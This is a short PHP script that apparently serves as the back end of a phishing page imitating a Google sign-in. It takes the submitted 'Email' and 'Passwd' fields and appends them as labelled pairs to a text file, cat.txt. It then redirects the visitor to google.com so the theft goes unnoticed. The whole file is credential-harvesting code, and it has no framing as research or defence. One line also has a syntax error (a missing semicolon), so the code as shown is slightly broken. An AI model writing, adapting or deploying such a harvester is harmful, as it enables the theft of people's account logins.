<?php
$var = $_POST['Email'];
$var2 = $_POST['Passwd'];
file_put_contents("cat.txt", "[EMAIL]: " . $var . " [PASS]: " . $var2 . "\n", FILE_APPEND);
header('Location: https://google.com/')
exit();
?>

